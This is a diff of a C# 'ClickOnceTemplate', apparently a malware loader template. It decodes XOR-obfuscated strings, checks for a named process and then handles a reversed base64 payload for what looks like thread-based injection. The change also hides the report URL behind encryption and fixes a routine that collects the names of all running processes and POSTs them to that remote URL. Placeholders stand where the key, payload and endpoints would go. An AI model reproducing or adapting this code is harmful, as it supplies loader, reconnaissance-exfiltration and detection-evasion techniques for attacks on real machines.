@@ -43,14 +43,14 @@ namespace ClickOnceTemplate
 
         static IntPtr VAR8()
         {
-			byte[] VAR9 = {[KEY]};
-			byte[] VAR100 = Convert.FromBase64String("[PROCESS_NAME]");
-			byte[] VAR101 = VAR16.VAR28(VAR9, VAR100);
-			byte[] VAR102 = Convert.FromBase64String("[CREATE_THREAD]");
-			byte[] VAR103 = VAR16.VAR28(VAR9, VAR102);
-			VAR50.VAR56();
-            if (Process.GetProcessesByName(Encoding.ASCII.GetString(VAR101)).Length > 0)
-            {				
+		byte[] VAR9 = {[KEY]};
+		byte[] VAR100 = Convert.FromBase64String("[PROCESS_NAME]");
+		byte[] VAR101 = VAR16.VAR28(VAR9, VAR100);
+		byte[] VAR102 = Convert.FromBase64String("[CREATE_THREAD]");
+		byte[] VAR103 = VAR16.VAR28(VAR9, VAR102);
+		VAR50.VAR56(VAR9);
+           	if (Process.GetProcessesByName(Encoding.ASCII.GetString(VAR101)).Length > 0)
+            	{				
 				
 				byte[] VAR10 = Convert.FromBase64String("[PAYLOAD]");
 				Array.Reverse(VAR10, 0, VAR10.Length);
@@ -74,20 +74,22 @@ namespace ClickOnceTemplate
     }
 	
 	public class VAR50 {
-		public static void VAR56() {
-		
-		    StringBuilder VAR51 = new StringBuilder();
-            foreach(Process VAR52 in Process.GetProcesses()) {
-                sb.Append(VAR52.ProcessName + ";");
-            }
-            WebRequest VAR53 = WebRequest.Create("[URL_REPORT]");
-            VAR53.Method = "POST";
-            byte[] VAR54 = Encoding.ASCII.GetBytes(sb.ToString());
-            VAR53.ContentType = "application/x-www-form-urlencoded";
-            VAR53.ContentLength = VAR54.Length;
-            Stream VAR55 = VAR54.GetRequestStream();
-            VAR55.Write(VAR54, 0, VAR54.Length);
-            VAR55.Close(); 
+		public static void VAR56(byte[] VAR59) {
+			byte[] VAR57 = Convert.FromBase64String("[URL_REPORT]");
+			byte[] VAR58 = VAR16.VAR28(VAR59, VAR57);
+
+			StringBuilder VAR51 = new StringBuilder();
+			foreach(Process VAR52 in Process.GetProcesses()) {
+				VAR51.Append(VAR52.ProcessName + ";");
+			}
+			WebRequest VAR53 = WebRequest.Create(Encoding.ASCII.GetString(VAR58));
+			VAR53.Method = "POST";
+			byte[] VAR54 = Encoding.ASCII.GetBytes(VAR51.ToString());
+			VAR53.ContentType = "application/x-www-form-urlencoded";
+			VAR53.ContentLength = VAR54.Length;
+			Stream VAR55 = VAR54.GetRequestStream();
+			VAR55.Write(VAR54, 0, VAR54.Length);
+			VAR55.Close(); 
 		}
 	}
 
